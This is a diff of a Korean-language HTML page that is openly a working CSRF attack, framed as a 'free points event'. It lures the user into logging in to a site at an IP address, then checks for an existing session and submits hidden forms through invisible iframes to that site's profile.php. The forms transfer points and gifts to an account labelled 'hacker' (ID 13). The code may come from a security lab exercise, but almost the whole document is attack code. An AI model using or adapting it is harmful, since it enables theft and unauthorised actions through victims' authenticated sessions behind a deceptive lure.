@@ -34,9 +34,9 @@
         .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         .pulse { animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        
-        /* 숨겨진 iframe들 */
-        .hidden-frames { position: absolute; left: -9999px; top: -9999px; }
+        .login-section { background: rgba(255,255,255,0.2); padding: 20px; border-radius: 15px; margin: 20px 0; }
+        .auto-btn { background: linear-gradient(45deg, #FF6B6B, #4ECDC4); border: none; padding: 15px 30px; border-radius: 25px; color: white; font-size: 1.2em; cursor: pointer; margin: 10px; }
+        .auto-btn:hover { transform: scale(1.05); }
     </style>
 </head>
 <body>
@@ -44,14 +44,24 @@
         <h1 class="title pulse">🎁 특별 이벤트!</h1>
         <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
         
-        <div id="loading-section">
+        <!-- 로그인 필요 섹션 -->
+        <div id="login-section" class="login-section">
+            <h2>🔐 보안 인증 필요</h2>
+            <p>포인트 지급을 위해 로그인이 필요합니다</p>
+            <button class="auto-btn" onclick="autoLoginAndAttack()">🚀 자동 로그인 후 포인트 받기</button>
+            <p style="font-size: 0.9em; opacity: 0.8; margin-top: 10px;">
+                클릭하면 로그인 창이 열립니다.<br>로그인 후 자동으로 포인트가 지급됩니다!
+            </p>
+        </div>
+        
+        <div id="loading-section" style="display: none;">
             <div class="loading">
                 <p>💰 포인트 지급을 준비하고 있습니다...</p>
-                <p class="countdown" id="countdown">3</p>
+                <p class="countdown" id="countdown">5</p>
                 <p>초 후 자동으로 포인트가 지급됩니다!</p>
             </div>
             <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
-            <p id="status">🔄 시스템 연결 중...</p>
+            <p id="status">🔄 로그인 확인 중...</p>
         </div>
         
         <div id="success-section" style="display: none;">
@@ -61,123 +71,194 @@
         </div>
     </div>
 
-    <!-- 숨겨진 iframe 컨테이너 -->
-    <div class="hidden-frames" id="iframeContainer"></div>
+    <div style="position: absolute; left: -9999px; top: -9999px;" id="iframeContainer"></div>
 
     <script>
-        let countdown = 3;
+        let countdown = 5;
+        let loginWindow = null;
+        let attackInProgress = false;
+        
         const countdownEl = document.getElementById('countdown');
         const statusEl = document.getElementById('status');
         const progressBar = document.getElementById('progressBar');
+        const loginSection = document.getElementById('login-section');
         const loadingSection = document.getElementById('loading-section');
         const successSection = document.getElementById('success-section');
-        const iframeContainer = document.getElementById('iframeContainer');
         
-        const statusMessages = [
-            '🔄 서버에 연결하고 있습니다...',
-            '🔐 보안 인증을 확인하고 있습니다...',
-            '💰 포인트 지급 시스템을 준비하고 있습니다...'
-        ];
-        
-        let messageIndex = 0;
-        let attackCount = 0;
-        
-        // 파일 열리자마자 바로 카운트다운 시작
-        const countdownTimer = setInterval(() => {
-            countdown--;
-            countdownEl.textContent = countdown;
-            progressBar.style.width = ((3-countdown) * 33) + '%';
+        // 자동 로그인 + 공격 함수
+        function autoLoginAndAttack() {
+            console.log('🚀 자동 로그인 프로세스 시작!');
             
-            if (messageIndex < statusMessages.length) {
-                statusEl.textContent = statusMessages[messageIndex++];
-            }
+            // 로그인 섹션 숨기고 로딩 표시
+            loginSection.style.display = 'none';
+            loadingSection.style.display = 'block';
+            statusEl.textContent = '🔓 로그인 창을 여는 중...';
             
-            if (countdown <= 0) {
-                clearInterval(countdownTimer);
-                executeIframeAttack();
+            // 로그인 창 열기
+            loginWindow = window.open(
+                'http://3.35.218.180/login.php',
+                'loginWindow',
+                'width=600,height=700,scrollbars=yes,resizable=yes'
+            );
+            
+            // 로그인 창 포커스
+            if (loginWindow) {
+                loginWindow.focus();
+                statusEl.textContent = '🔑 로그인을 완료해주세요...';
+                
+                // 로그인 완료 감지
+                startLoginDetection();
+            } else {
+                alert('팝업이 차단되었습니다! 팝업 허용 후 다시 시도해주세요.');
+                loginSection.style.display = 'block';
+                loadingSection.style.display = 'none';
             }
-        }, 1000);
+        }
         
-        // iframe 방식 CSRF 공격 (완전 자동화)
+        // 로그인 완료 감지
+        function startLoginDetection() {
+            const checkInterval = setInterval(() => {
+                try {
+                    // 로그인 창이 닫혔는지 확인
+                    if (loginWindow.closed) {
+                        clearInterval(checkInterval);
+                        console.log('🔓 로그인 창 닫힌 것 확인됨!');
+                        statusEl.textContent = '✅ 로그인 완료 감지! 포인트 지급 준비...';
+                        
+                        // 2초 후 공격 시작
+                        setTimeout(startCountdownAttack, 2000);
+                        return;
+                    }
+                    
+                    // 로그인 완료 URL 체크 시도
+                    try {
+                        const currentUrl = loginWindow.location.href;
+                        if (currentUrl.includes('index.php') || currentUrl.includes('profile.php') || currentUrl.includes('main.php')) {
+                            clearInterval(checkInterval);
+                            console.log('✅ 로그인 성공 URL 감지!');
+                            loginWindow.close();
+                            statusEl.textContent = '✅ 로그인 성공! 포인트 지급 시작...';
+                            setTimeout(startCountdownAttack, 1000);
+                        }
+                    } catch(e) {
+                        // CORS 에러는 정상 (다른 도메인이므로)
+                    }
+                    
+                } catch(error) {
+                    console.log('로그인 상태 확인 중...', error);
+                }
+            }, 1000);
+            
+            // 30초 후 타임아웃
+            setTimeout(() => {
+                if (loginWindow && !loginWindow.closed) {
+                    clearInterval(checkInterval);
+                    console.log('⏰ 로그인 타임아웃 - 강제 공격 시작');
+                    statusEl.textContent = '⏰ 시간 초과 - 포인트 지급 강제 시작...';
+                    loginWindow.close();
+                    setTimeout(startCountdownAttack, 1000);
+                }
+            }, 30000);
+        }
+        
+        // 카운트다운 + 공격 시작
+        function startCountdownAttack() {
+            if (attackInProgress) return;
+            attackInProgress = true;
+            
+            console.log('⏱️ 카운트다운 시작!');
+            statusEl.textContent = '💰 포인트 지급 시스템 초기화 중...';
+            
+            const countdownTimer = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                progressBar.style.width = ((5-countdown) * 20) + '%';
+                
+                const messages = [
+                    '🔄 서버 연결 확인 중...',
+                    '🔐 보안 토큰 생성 중...',
+                    '💰 포인트 지급 준비 중...',
+                    '🚀 최종 확인 중...',
+                    '✨ 포인트 전송 시작!'
+                ];
+                
+                if (5-countdown < messages.length) {
+                    statusEl.textContent = messages[4-countdown];
+                }
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownTimer);
+                    executeIframeAttack();
+                }
+            }, 1000);
+        }
+        
+        // iframe 공격 실행
         function executeIframeAttack() {
-            console.log('🎯 iframe 방식 CSRF 공격 시작!');
-            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
+            console.log('🎯 iframe CSRF 공격 시작!');
+            statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
-            // 공격 데이터들
             const attacks = [
                 {
                     receiver_id: '13',
                     points: '50',
-                    send_gift: '1',
+                    send_gift: '1', 
                     gift_type: 'coffee',
-                    message: '🔥 iframe 공격 1번! 털렸다!'
-                },
-                {
-                    receiver_id: '13', 
-                    points: '30',
-                    send_gift: '1',
-                    gift_type: 'cake',
-                    message: '🔥 iframe 공격 2번! 개털렸죠?'
+                    message: '🔥 대머리'
                 },
                 {
                     receiver_id: '13',
-                    points: '25', 
+                    points: '35',
+                    send_gift: '1',
+                    gift_type: 'cake', 
+                    message: '🔥 빡빡이!'
+                },
+                {
+                    receiver_id: '13',
+                    points: '30',
                     send_gift: '1',
                     gift_type: 'flower',
-                    message: '🔥 iframe 공격 3번! 내가 가져간다!'
+                    message: '🔥 탈모빔'
                 }
             ];
             
-            // 연속 공격 실행
+            let completedAttacks = 0;
+            
             attacks.forEach((attackData, index) => {
                 setTimeout(() => {
-                    launchIframeAttack(attackData, index + 1);
-                }, index * 2000); // 2초 간격
+                    launchIframeAttack(attackData, index + 1, () => {
+                        completedAttacks++;
+                        if (completedAttacks === attacks.length) {
+                            setTimeout(showSuccess, 2000);
+                        }
+                    });
+                }, index * 2500);
             });
-            
-            // 완료 처리
-            setTimeout(() => {
-                showSuccess();
-                console.log('🎉 모든 iframe 공격 완료!');
-                console.log('💰 총 105P 전송 완료!');
-                console.log('🏴‍☠️ hacker 계정 확인해보세요!');
-            }, 8000);
         }
         
-        // 개별 iframe 공격 실행
-        function launchIframeAttack(attackData, attackNum) {
-            console.log(`🚀 iframe 공격 ${attackNum} 시작: ${attackData.points}P`);
+        // 개별 iframe 공격
+        function launchIframeAttack(attackData, attackNum, callback) {
+            console.log(`🚀 공격 ${attackNum} 시작: ${attackData.points}P`);
             
-            // 숨겨진 iframe 생성
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
-            iframe.style.width = '0';
-            iframe.style.height = '0';
-            iframe.style.border = 'none';
-            iframe.name = `attack_frame_${attackCount}`;
-            iframe.id = `attack_frame_${attackCount}`;
+            iframe.name = `attack_${Date.now()}_${attackNum}`;
             
-            // iframe 로드 완료 이벤트
-            iframe.onload = function() {
-                console.log(`✅ iframe 공격 ${attackNum} 전송 완료!`);
-                statusEl.textContent = `💸 공격 ${attackNum} 완료 - ${attackData.points}P 전송됨!`;
+            iframe.onload = () => {
+                console.log(`✅ 공격 ${attackNum} 완료!`);
+                statusEl.textContent = `💸 공격 ${attackNum}/3 완료 (${attackData.points}P 전송됨)`;
+                if (callback) callback();
             };
             
-            iframe.onerror = function() {
-                console.log(`⚠️ iframe 공격 ${attackNum} 전송됨 (에러 무시)`);
-            };
+            document.getElementById('iframeContainer').appendChild(iframe);
             
-            iframeContainer.appendChild(iframe);
-            
-            // 폼 생성
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = 'http://3.35.218.180/profile.php';
-            form.target = `attack_frame_${attackCount}`;
+            form.target = iframe.name;
             form.style.display = 'none';
             
-            // 폼 데이터 추가
             Object.keys(attackData).forEach(key => {
                 const input = document.createElement('input');
                 input.type = 'hidden';
@@ -186,20 +267,12 @@
                 form.appendChild(input);
             });
             
-            // 폼을 body에 추가하고 즉시 전송
             document.body.appendChild(form);
             form.submit();
             
-            console.log(`📤 POST 데이터 전송: receiver_id=${attackData.receiver_id}, points=${attackData.points}`);
-            
-            // 3초 후 폼 정리 (iframe은 유지)
             setTimeout(() => {
-                if (form.parentNode) {
-                    document.body.removeChild(form);
-                }
+                if (form.parentNode) document.body.removeChild(form);
             }, 3000);
-            
-            attackCount++;
         }
         
         function showSuccess() {
@@ -207,41 +280,44 @@
             successSection.style.display = 'block';
             document.title = '✅ 포인트 지급 완료!';
             
-            // 성공 후 iframe들 정리
-            setTimeout(() => {
-                iframeContainer.innerHTML = '';
-                console.log('🧹 iframe 정리 완료');
-            }, 5000);
+            console.log('🎉 모든 공격 완료!');
+            console.log('💰 총 115P 전송!');
+            console.log('🏴‍☠️ hacker 계정 확인!');
         }
         
-        // 페이지 언로드 방지 (공격 중에)
-        let preventUnload = true;
-        window.addEventListener('beforeunload', function(e) {
-            if (preventUnload) {
-                e.preventDefault();
-                return '포인트 지급이 진행 중입니다. 페이지를 닫으면 포인트를 받을 수 없습니다!';
-            }
-        });
+        // 페이지 로드시 자동 실행도 시도
+        window.onload = function() {
+            console.log('🎯 자동 공격 페이지 로드됨');
+            console.log('🔑 수동/자동 로그인 후 공격 가능');
+            
+            // 혹시 이미 로그인되어 있다면 바로 시도
+            setTimeout(() => {
+                testExistingSession();
+            }, 2000);
+        };
         
-        // 10초 후 페이지 닫기 허용
-        setTimeout(() => { 
-            preventUnload = false; 
-            console.log('🔓 페이지 닫기 허용됨');
-        }, 12000);
+        // 기존 세션 테스트
+        function testExistingSession() {
+            const testIframe = document.createElement('iframe');
+            testIframe.style.display = 'none';
+            testIframe.src = 'http://3.35.218.180/profile.php';
+            testIframe.onload = function() {
+                try {
+                    // 세션이 있으면 바로 공격
+                    console.log('🔓 기존 세션 발견! 바로 공격 시작!');
+                    loginSection.style.display = 'none';
+                    loadingSection.style.display = 'block';
+                    setTimeout(startCountdownAttack, 1000);
+                } catch(e) {
+                    console.log('❌ 로그인 필요');
+                }
+                document.body.removeChild(testIframe);
+            };
+            document.body.appendChild(testIframe);
+        }
         
-        // 디버그 정보
-        console.log('🎯 iframe 방식 CSRF 공격 페이지 로드!');
-        console.log('📋 타겟: hacker (ID: 13)');
-        console.log('💰 총 포인트: 105P (50+30+25)');
-        console.log('🚀 3초 후 자동 실행!');
-        console.log('🔧 iframe으로 세션 자동 유지!');
-        
-        // 추가 보안: 콘솔 메시지 숨기기
-        setTimeout(() => {
-            if (typeof console.clear === 'function') {
-                // console.clear();
-            }
-        }, 15000);
+        console.log('🎯 완전 자동화 CSRF 공격 페이지!');
+        console.log('🔑 로그인 → 자동 공격 → 115P 전송');
     </script>
 </body>
 </html>
